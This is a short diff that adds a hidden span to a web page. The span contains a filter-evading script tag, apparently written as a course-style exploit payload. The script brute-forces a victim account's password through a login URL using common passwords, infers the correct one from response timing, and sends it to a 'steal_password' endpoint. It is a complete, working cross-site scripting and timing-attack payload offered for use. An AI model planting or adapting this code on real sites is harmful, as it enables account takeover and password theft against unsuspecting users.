@@ -1,0 +1,28 @@
+<span style='display:none'>
+  <ImG id='test'>
+  <sCrIpT>
+    var dictionary = [`password`, `123456`, `12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var index = 0;
+    var test = document.getElementById(`test`);
+    var req = new XMLHttpRequest();
+    req.withCredentials = true;
+    var times = [0, 0, 0, 0, 0, 0, 0];
+    test.onerror = ()=> {
+      var end = new Date();
+      times[index - 1] = end - start;
+      start = new Date();
+      if (index < dictionary.length) {
+        test.src = `login?username=userx&password=${dictionary[index]}`;
+      } else {
+        var max = Math.max(...times);
+        var maxIndex = times.indexOf(max);
+        req.open(`GET`, `steal_password?password=${dictionary[maxIndex]}&timeElapsed=${max}`);
+        req.send();
+      }
+      index += 1;
+    };
+    var start = new Date();
+    test.src = `login?username=userx&password=${dictionary[index]}`;
+    index += 1;
+  </sCripT>
+</span>
